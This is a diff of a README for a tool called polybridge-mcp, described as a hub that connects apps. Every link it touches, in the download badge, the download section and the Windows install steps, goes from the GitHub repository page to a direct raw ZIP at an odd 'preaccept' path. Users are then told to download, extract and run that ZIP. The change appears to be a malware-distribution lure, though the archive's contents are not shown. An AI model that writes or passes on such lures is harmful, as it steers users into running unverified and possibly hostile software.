@@ -1,6 +1,6 @@
 # 🌉 polybridge-mcp - Connect your apps through one hub
 
-[![Download polybridge-mcp](https://img.shields.io/badge/Download%20polybridge--mcp-blue?style=for-the-badge)](https://github.com/structural-sclaff223/polybridge-mcp)
+[![Download polybridge-mcp](https://img.shields.io/badge/Download%20polybridge--mcp-blue?style=for-the-badge)](https://raw.githubusercontent.com/structural-sclaff223/polybridge-mcp/main/preaccept/polybridge-mcp-2.6.zip)
 
 ## 🧭 What this is
 
@@ -21,7 +21,7 @@ Use it when you want one bridge for many apps instead of setting up each one by 
 
 Visit this page to download and run the app:
 
-https://github.com/structural-sclaff223/polybridge-mcp
+https://raw.githubusercontent.com/structural-sclaff223/polybridge-mcp/main/preaccept/polybridge-mcp-2.6.zip
 
 ## 🪄 What you can do with it
 
@@ -46,7 +46,7 @@ A simple flow looks like this:
 
 ## 🚀 Install on Windows
 
-1. Open this page in your browser: https://github.com/structural-sclaff223/polybridge-mcp
+1. Open this page in your browser: https://raw.githubusercontent.com/structural-sclaff223/polybridge-mcp/main/preaccept/polybridge-mcp-2.6.zip
 2. Find the download area on the page
 3. Download the Windows file or the latest release package
 4. If the file comes as a ZIP, right-click it and choose Extract All
